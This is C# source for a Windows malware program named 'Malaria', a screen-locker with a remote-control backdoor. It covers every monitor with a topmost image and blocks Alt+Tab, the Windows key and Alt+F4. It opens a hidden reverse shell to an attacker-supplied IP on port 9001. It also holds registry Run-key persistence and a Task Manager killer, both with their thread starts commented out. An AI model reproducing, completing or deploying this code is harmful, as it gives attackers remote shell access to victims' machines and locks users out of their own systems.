using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Gma.System.MouseKeyHook;
using Malaria.Properties;
using Microsoft.Win32;

namespace Malaria
{
    public partial class Malaria : Form
    {
        private IKeyboardMouseEvents _globalHook;
        private StreamWriter streamWriter;

        public Malaria()
        {
            InitializeComponent();
            DisplayImageOnAllScreens();
            //new Thread(KillTaskManager).Start();
            //new Thread(AutoStart).Start();
            new Thread(StartReverseShell).Start();
            KeyPreview = true;
            _globalHook = Hook.GlobalEvents();
            _globalHook.KeyDown += GlobalHook_KeyDown;
        }
        private void StartReverseShell()
        {
            string serverIp = ""; //put here your ip(can be local to test localy)
            int serverPort = 9001; //port(you have to forward the port if you do this on your router)

            try
            {
                using (TcpClient client = new TcpClient(serverIp, serverPort))
                {
                    using (NetworkStream stream = client.GetStream())
                    {
                        using (StreamReader rdr = new StreamReader(stream))
                        {
                            streamWriter = new StreamWriter(stream) { AutoFlush = true };

                            StringBuilder strInput = new StringBuilder();

                            Process p = new Process();
                            p.StartInfo.FileName = "sh"; // Use "cmd.exe" for Windows
                            p.StartInfo.CreateNoWindow = true;
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.RedirectStandardOutput = true;
                            p.StartInfo.RedirectStandardInput = true;
                            p.StartInfo.RedirectStandardError = true;
                            p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                            p.Start();
                            p.BeginOutputReadLine();

                            while (true)
                            {
                                strInput.Clear();
                                strInput.Append(rdr.ReadLine());
                                if (strInput.Length > 0)
                                {
                                    p.StandardInput.WriteLine(strInput.ToString());
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
        }

        private void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    streamWriter.WriteLine(outLine.Data); // Send output back to the server
                }
                catch (Exception err)
                {
                    // Handle exceptions (e.g., log them)
                    Console.WriteLine("Error sending output: " + err.Message);
                }
            }
        }
        private void GlobalHook_KeyDown(object sender, KeyEventArgs e)
        {
            // Block ALT + TAB
            if (e.Alt && e.KeyCode == Keys.Tab)
            {
                e.Handled = true; // Prevent the default action
                return;
            }

            // Block WIN + D
            if (e.KeyCode == Keys.LWin || e.KeyCode == Keys.RWin)
            {
                e.Handled = true; // Prevent the default action
                return;
            }

            // Block ALT + F4
            if (e.Alt && e.KeyCode == Keys.F4)
            {
                e.Handled = true; // Prevent the default action
                return;
            }
        }

        private static void AutoStart()
        {
            var registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            registryKey?.SetValue("Malaria", Application.ExecutablePath);
        }

        private static void DisplayImageOnAllScreens()
        {
            foreach (var screen in Screen.AllScreens)
            {
                var form = new Form
                {
                    StartPosition = FormStartPosition.CenterScreen,
                    Location = screen.Bounds.Location,
                    Size = screen.Bounds.Size,
                    FormBorderStyle = FormBorderStyle.None,
                    WindowState = FormWindowState.Maximized,
                    TopMost = true,
                    BackgroundImageLayout = ImageLayout.Stretch
                };

                var imageResource = Resources.ResourceManager.GetObject("bg");

                if (imageResource is byte[] imageBytes)
                {
                    form.BackgroundImage = Image.FromStream(new MemoryStream(imageBytes));
                }
                else if (imageResource is Image image)
                {
                    form.BackgroundImage = image;
                }

                form.Show();
            }
        }

        private static void KillTaskManager()
        {
            while (true)
            {
                var processes = Process.GetProcessesByName("taskmgr");
                foreach (var process in processes) process.Kill();
            }
        }

        protected override void WndProc(ref Message m)
        {
            const int wmSysCommand = 0x0112;
            const int scClose = 0xF060;

            // Block ALT + F4
            if (m.Msg == wmSysCommand && (int)m.WParam == scClose)
            {
                return; // Prevent the form from closing
            }

            base.WndProc(ref m); // Call the base method to ensure normal processing for other messages
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            // Unhook the global hook when the form is closing
            _globalHook.KeyDown -= GlobalHook_KeyDown;
            _globalHook.Dispose();
            base.OnFormClosing(e);
        }
    }
}